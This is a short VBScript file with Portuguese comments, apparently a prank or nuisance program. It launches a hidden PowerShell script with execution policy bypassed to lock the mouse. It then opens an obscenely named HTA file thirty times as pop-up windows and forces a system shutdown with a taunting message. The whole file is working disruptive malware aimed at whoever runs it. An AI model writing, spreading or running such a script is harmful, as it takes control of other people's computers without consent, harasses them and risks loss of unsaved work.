Set shell = CreateObject("WScript.Shell")

' Iniciar travamento do mouse
shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File trava.ps1", 0, False

' Abrir várias janelas flutuantes
For i = 1 To 30
    shell.Run "pornolesbico.hta"
    WScript.Sleep 100
Next

' Esperar 10 segundos e desligar
WScript.Sleep 10000
shell.Run "shutdown -s -t 60 -c ""Seu PC vai apagar em 1 minuto..."""